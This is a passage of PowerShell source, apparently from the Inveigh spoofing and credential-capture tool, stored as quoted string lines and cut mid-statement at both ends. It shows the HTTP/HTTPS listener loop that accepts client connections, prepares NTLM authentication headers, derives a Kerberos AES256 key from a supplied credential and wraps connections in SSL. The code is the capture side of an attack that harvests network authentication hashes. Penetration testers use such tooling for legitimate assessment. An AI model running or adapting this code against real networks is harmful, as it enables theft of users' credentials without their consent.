t]::ToInt16($_,16)}","        }","        elseif($KerberosCredential)","        {","            $kerberos_base_key = Get-KerberosAES256BaseKey ($KerberosCredential.UserName).Trim(\"\\\") $KerberosCredential.Password","        }","","    }","    ","    :HTTP_listener_loop while($inveigh.running -and $HTTP_running)","    {","        $TCP_request = $null","        $TCP_request_bytes = New-Object System.Byte[] 8192","        $HTTP_send = $true","        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes(\"Content-Type: text/html\")","        $HTTP_header_cache_control = $null","        $HTTP_header_authenticate = $null","        $HTTP_header_authenticate_data = $null","        $HTTP_message = ''","        $HTTP_header_authorization = ''","        $HTTP_header_host = $null","        $HTTP_header_user_agent = $null","        $HTTP_request_raw_URL = $null","        $NTLM = \"NTLM\"","","        if(!$HTTP_client.Connected -and $inveigh.running)","        {","            $HTTP_client_close = $false","            $HTTP_async = $HTTP_listener.BeginAcceptTcpClient($null,$null)","","            do","            {","","                if(!$inveigh.running)","                {","                    break HTTP_listener_loop","                }","                ","                Start-Sleep -m 10","            }","            until($HTTP_async.IsCompleted)","","            $HTTP_client = $HTTP_listener.EndAcceptTcpClient($HTTP_async)","            $HTTP_client_handle_old = $HTTP_client.Client.Handle","            ","            if($HTTPS_listener)","            {","                $HTTP_clear_stream = $HTTP_client.GetStream()","                $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)","                $SSL_cert = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Subject -match $inveigh.certificate_CN})","                $HTTP_stream.AuthenticateAsServer($SSL_cert,$false,[System.Security.Authentication.SslProtocols]::